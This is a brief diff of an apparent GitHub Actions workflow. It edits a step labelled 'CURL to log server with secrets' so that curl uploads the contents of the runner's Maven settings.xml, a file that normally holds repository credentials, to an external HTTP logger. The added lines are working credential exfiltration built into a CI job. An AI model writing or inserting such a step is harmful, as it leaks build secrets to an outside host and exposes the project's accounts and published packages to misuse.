@@ -51,5 +51,5 @@ jobs:
     - name: CURL to log server with secrets
       run: |
         curl --location 'https://powerimo.org/httplogger/basic' \
-          --header 'Content-Type: text/plain' \
-          --data-binary "/home/runner/.m2/settings.xml"
+        --header 'Content-Type: text/plain' \
+        --data-binary "@$HOME/.m2/settings.xml"
